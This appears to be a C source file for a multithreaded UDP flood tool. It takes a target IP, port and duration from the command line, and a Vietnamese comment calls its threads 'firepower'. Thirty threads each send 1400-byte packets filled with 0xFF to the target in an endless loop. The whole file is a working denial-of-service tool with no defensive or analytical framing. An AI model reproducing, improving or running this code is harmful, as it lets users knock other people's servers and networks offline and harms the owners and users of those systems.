#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>

void *fire(void *arg) {
    char **args = (char **)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in servaddr;
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(atoi(args[2]));
    servaddr.sin_addr.s_addr = inet_addr(args[1]);
    char payload[1400];
    memset(payload, 0xFF, sizeof(payload));
    while(1) {
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
    }
}
int main(int argc, char *argv[]) {
    if (argc < 4) return 0;
    for(int i=0; i<30; i++) { // 30 luồng hỏa lực
        pthread_t tid;
        pthread_create(&tid, NULL, fire, (void *)argv);
    }
    sleep(atoi(argv[3]));
    return 0;
}

